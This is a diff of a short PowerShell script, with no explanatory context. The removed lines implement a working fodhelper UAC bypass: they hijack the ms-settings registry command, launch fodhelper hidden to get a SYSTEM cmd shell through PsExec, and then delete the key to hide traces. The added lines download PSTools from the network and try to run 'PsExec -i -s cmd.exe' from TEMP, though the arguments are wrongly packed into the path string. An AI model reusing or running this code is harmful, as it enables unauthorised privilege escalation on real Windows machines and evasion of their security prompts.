@@ -1,10 +1,7 @@
-function ffv {
-    $Key = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
-    New-Item -Path $Key -Force
-    New-ItemProperty -Path $Key -Name "DelegateExecute" -Value "" -Force
-    Set-ItemProperty -Path $Key -Name "(default)" -Value "$PWD\psexec.exe -i -s cmd.exe" -Force
-    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
-    Start-Sleep 3
-    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
-}
-ffv  
+$url = "https://download.sysinternals.com/files/PSTools.zip"
+$out = "$env:TEMP\PSTools.zip"
+
+Invoke-WebRequest $url -OutFile $out
+
+Expand-Archive $out -DestinationPath "$env:TEMP\PSTools" -Force
+Start-Process "$env:TEMP\PSTools\PsExec.exe -i -s cmd.exe"
